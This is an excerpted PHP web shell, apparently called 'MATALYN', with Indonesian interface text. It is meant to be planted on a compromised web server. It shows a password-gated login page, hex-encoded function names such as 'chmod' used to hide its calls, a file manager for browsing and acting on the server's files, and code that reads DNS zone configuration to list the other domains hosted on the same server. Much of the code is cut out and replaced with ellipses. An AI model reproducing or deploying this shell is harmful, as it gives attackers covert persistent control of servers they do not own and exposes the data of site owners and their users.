...
$stored_hash = '$2y$10$Prmpwm3bBx.o0IZ7PKYP2uD8NGMn97hPbwvjC.DMsB.0LDtlWIkYq';
...
if (!isset($_SESSION['authenticated'])) {
    ...
    ?>
    <html>
        <link rel="icon" type="image/x-icon" href="https://cloudimages.io/my-uploads/lynn.png">
    <head><style>
    body { background-image: url("https://semogangerank-kpcae.wordpress.com/wp-content/uploads/2025/12/matalyn.png"); background-size: cover; background-position: center;  background-repeat: no-repeat; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    form { padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
...
$Array = [
    ...
    '63686d6f64',
    '7379735f6765745f74656d705f646972',
...
<head>
    ...
    <title>MATALYN [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    ...
    <style>
        ...
        body {
            background-color:rgb(111 0 0 / 86%);
    ...
    body {
      ...
      min-height: 100vh;
      width: 100%;
      background: url("https://semogangerank-kpcae.wordpress.com/wp-content/uploads/2025/12/matalyn.png") no-repeat center top;
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-brands fa-github"></i>&nbsp;www.github.com/matalyn215</li>
            <?php
$zoneList = [];
...
<div style="background:#6b1e1e00; padding:15px; border-radius:6px; color:#fff; font-family:monospace;">
    <h3 style="margin-top:0;">Status Domain</h3>

    <p>
        Domain aktif (tempat shell ini berjalan):<br>
        <a href="https://<?= $_SERVER['HTTP_HOST'] ?>/" target="_blank" style="color:#0ff;">
            https://<?= $_SERVER['HTTP_HOST'] ?>/
        </a>
    </p>

    <p>
        Jumlah DNS zone yang terdeteksi pada server:<br>
        <b style="color:yellow; font-size:16px; cursor:pointer;" id="toggleDomain">
            <?= $total ?> Domain
        </b>
    </p>

    <div id="domainTable" style="display:none; margin-top:8px;">
        <ul class="zonelist" style="max-height:250px; overflow:auto; background:#000; padding:10px; border-radius:4px; list-style:none; color:#0f0;">
        <?php foreach ($zoneList as $d): ?>
            <li style="margin:4px 0;">
                <a href="http://<?= htmlspecialchars($d, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') ?>/" 
                   target="_blank" 
                   style="text-decoration:none; color:#0ff;">
...
<script>
document.getElementById('toggleDomain').addEventListener('click', function() {
    var tbl = document.getElementById('domainTable');
    if (tbl.style.display === 'none') {
        ...
        tbl.style.display = 'none';
            ...
            <li class="logo-gecko" style="text-align: right;">
  <img src="https://semogangerank-kpcae.wordpress.com/wp-content/uploads/2025/12/tmatalyn-1.png" style="max-width: 100%; height: auto;">
</li>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="//github.com/matalyn215/" class="btn-submit"><i class="fa-solid fa-link"></i>&nbsp;README</a></li>
        </ul>
    </div>
            ...
            <form action="" method="post">
                <tbody>
                    ...
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:red;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
...
function s()
{
    ...
    if (!$d0mains) {
        ...
        $host = trim($host);
        $host = htmlspecialchars($host, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

        $baseUrl = rtrim($scheme . '://' . $host, '/') . '/';

        $dom = '<a href="' . $baseUrl . '" target="_blank" rel="noopener noreferrer">' . $baseUrl . '</a>';
        ...
        foreach ($d0mains as $d0main) {
            if (@strstr($d0main, "zone")) {
                preg_match_all('#zone\s+"(.*?)"#', $d0main, $domains);
                if (!empty($domains[1][0]) && strlen(trim($domains[1][0])) > 2) {
                    $count++;
                }
            }
        }
